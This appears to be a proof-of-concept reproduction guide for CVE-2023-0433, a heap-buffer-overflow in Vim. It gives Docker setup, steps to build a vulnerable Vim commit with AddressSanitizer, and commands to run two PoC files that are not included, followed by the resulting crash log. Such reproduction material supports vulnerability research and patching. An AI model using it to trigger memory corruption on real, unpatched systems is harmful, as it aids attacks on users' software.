### CVE-2023-0433

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/ae933869-a1ec-402a-bbea-d51764c6618e/)

### Docker Container Run Command
```shell
docker build -t cve-2023-0433-poc .
docker run -itd --name CVE-2023-0433-POC cve-2023-0433-poc
docker exec -it CVE-2023-0433-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the Vim repository. (ssh-keygen)
cd /poc
git clone git@github.com:vim/vim.git

# Rollback to the vulnerable version.
cd vim/
git reset --hard f97a295ccaa9803367f3714cdefce4e2283c771d

# Install the compilation and installation dependencies for Vim.
apt install gcc make clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Enter the `src` directory.
cd ./src

# Configure, compile, and install Vim.
./configure --with-features=huge --enable-gui=no --enable-pythoninterp=no CFLAGS="-fsanitize=address -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address"
make
make install

# Open the poc file.
vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/POC1 -c :qa!
or
ASAN_OPTIONS=detect_leaks=1 vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/POC1 -c :qa!

vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/POC2 -c :qa!
or
ASAN_OPTIONS=detect_leaks=1 vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/POC2 -c :qa!
```

### Description
Observed that:
```shell
=================================================================
==9597==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffff7ca1510d at pc 0xaaaaac22bca0 bp 0xfffff095b300 sp 0xfffff095b310
READ of size 1 at 0xffff7ca1510d thread T0
#0 0xaaaaac22bc9c  (/usr/local/bin/vim+0x841c9c)
#1 0xaaaaac22f464  (/usr/local/bin/vim+0x845464)
#2 0xaaaaac22d8c0  (/usr/local/bin/vim+0x8438c0)
#3 0xaaaaabf6b464  (/usr/local/bin/vim+0x581464)
#4 0xaaaaabf123f4  (/usr/local/bin/vim+0x5283f4)
#5 0xaaaaabd45f08  (/usr/local/bin/vim+0x35bf08)
#6 0xaaaaabd45c64  (/usr/local/bin/vim+0x35bc64)
#7 0xaaaaabd45334  (/usr/local/bin/vim+0x35b334)
#8 0xaaaaabd1baf0  (/usr/local/bin/vim+0x331af0)
#9 0xaaaaabd10bf8  (/usr/local/bin/vim+0x326bf8)
#10 0xaaaaac0dedc4  (/usr/local/bin/vim+0x6f4dc4)
#11 0xaaaaac0e014c  (/usr/local/bin/vim+0x6f614c)
#12 0xaaaaac0dc690  (/usr/local/bin/vim+0x6f2690)
#13 0xaaaaac0dc6ec  (/usr/local/bin/vim+0x6f26ec)
#14 0xaaaaabd1baf0  (/usr/local/bin/vim+0x331af0)
#15 0xaaaaabd10bf8  (/usr/local/bin/vim+0x326bf8)
#16 0xaaaaabd0eb30  (/usr/local/bin/vim+0x324b30)
#17 0xaaaaac43f5d4  (/usr/local/bin/vim+0xa555d4)
#18 0xaaaaac437450  (/usr/local/bin/vim+0xa4d450)
#19 0xaaaaac436b38  (/usr/local/bin/vim+0xa4cb38)
#20 0xffff810b73f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#21 0xffff810b74c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#22 0xaaaaabb4476c  (/usr/local/bin/vim+0x15a76c)

0xffff7ca1510d is located 13 bytes to the right of 4096-byte region [0xffff7ca14100,0xffff7ca15100)
allocated by thread T0 here:
#0 0xffff813da2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xaaaaabb44cc4  (/usr/local/bin/vim+0x15acc4)
#2 0xaaaaabb44a4c  (/usr/local/bin/vim+0x15aa4c)
#3 0xaaaaac44411c  (/usr/local/bin/vim+0xa5a11c)
#4 0xaaaaac441fb4  (/usr/local/bin/vim+0xa57fb4)
#5 0xaaaaabea49b0  (/usr/local/bin/vim+0x4ba9b0)
#6 0xaaaaabe9eaa4  (/usr/local/bin/vim+0x4b4aa4)
#7 0xaaaaabea482c  (/usr/local/bin/vim+0x4ba82c)
#8 0xaaaaabea3130  (/usr/local/bin/vim+0x4b9130)
#9 0xaaaaabb99c48  (/usr/local/bin/vim+0x1afc48)
#10 0xaaaaabf58c28  (/usr/local/bin/vim+0x56ec28)
#11 0xaaaaac22fd60  (/usr/local/bin/vim+0x845d60)
#12 0xaaaaac22d8c0  (/usr/local/bin/vim+0x8438c0)
#13 0xaaaaabf6b464  (/usr/local/bin/vim+0x581464)
#14 0xaaaaabf123f4  (/usr/local/bin/vim+0x5283f4)
#15 0xaaaaabd45f08  (/usr/local/bin/vim+0x35bf08)
#16 0xaaaaabd45c64  (/usr/local/bin/vim+0x35bc64)
#17 0xaaaaabd45334  (/usr/local/bin/vim+0x35b334)
#18 0xaaaaabd1baf0  (/usr/local/bin/vim+0x331af0)
#19 0xaaaaabd10bf8  (/usr/local/bin/vim+0x326bf8)
#20 0xaaaaac0dedc4  (/usr/local/bin/vim+0x6f4dc4)
#21 0xaaaaac0e014c  (/usr/local/bin/vim+0x6f614c)
#22 0xaaaaac0dc690  (/usr/local/bin/vim+0x6f2690)
#23 0xaaaaac0dc6ec  (/usr/local/bin/vim+0x6f26ec)
#24 0xaaaaabd1baf0  (/usr/local/bin/vim+0x331af0)
#25 0xaaaaabd10bf8  (/usr/local/bin/vim+0x326bf8)
#26 0xaaaaabd0eb30  (/usr/local/bin/vim+0x324b30)
#27 0xaaaaac43f5d4  (/usr/local/bin/vim+0xa555d4)
#28 0xaaaaac437450  (/usr/local/bin/vim+0xa4d450)
#29 0xaaaaac436b38  (/usr/local/bin/vim+0xa4cb38)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/usr/local/bin/vim+0x841c9c)
Shadow bytes around the buggy address:
0x200fef9429d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fef9429e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fef9429f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fef942a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fef942a10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200fef942a20: fa[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200fef942a30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200fef942a40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200fef942a50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200fef942a60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200fef942a70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==9597==ABORTING
```



